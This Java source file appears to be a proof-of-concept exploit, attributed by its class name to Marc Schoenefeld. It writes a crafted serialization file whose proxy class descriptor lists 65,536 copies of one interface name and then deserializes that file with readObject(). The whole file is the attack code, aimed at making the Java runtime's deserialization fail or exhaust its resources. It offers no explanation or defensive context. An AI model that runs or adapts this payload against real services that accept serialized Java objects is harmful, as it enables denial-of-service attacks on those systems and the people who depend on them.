
import java.io.*;

public class MarcSchoenefeldProxySerialGen {
   public static void main(String[] a) throws Exception {
       int anz = 65536;
       FileOutputStream fos = new FileOutputStream("genproxy"+anz+".ser");
       DataOutputStream dos = new DataOutputStream(fos);
             String itfName ="java.awt.Conditional";
            dos.writeByte((byte) 0xAC);
       dos.writeByte((byte) 0xED);
       dos.writeByte((byte) 0x00);
       dos.writeByte((byte) 0x05);
       dos.writeByte((byte) 0x76);
       dos.writeByte((byte) 0x7D);
       dos.writeInt( anz);
                   for (int i = 0; i < anz ; i++) {
           dos.writeUTF(itfName);           }
             dos.writeByte((byte) 'x');
       dos.writeByte((byte) 'r');
       dos.writeUTF("java.lang.reflect.Proxy");
       dos.writeInt(0xE127DA20);
       dos.writeInt(0xCC1043CB);
       dos.writeInt(0x0200014C);
       dos.writeInt(0x00016874);
       dos.writeUTF("Ljava/lang/reflect/InvocationHandler;");
       dos.writeByte((byte) 'x');
       dos.writeByte((byte) 'p');
       dos.flush();
       fos.close();
             FileInputStream fis = new FileInputStream("genproxy"+anz+".ser");
       ObjectInputStream ois = new ObjectInputStream(fis);
       Object o = ois.readObject();
               }
}

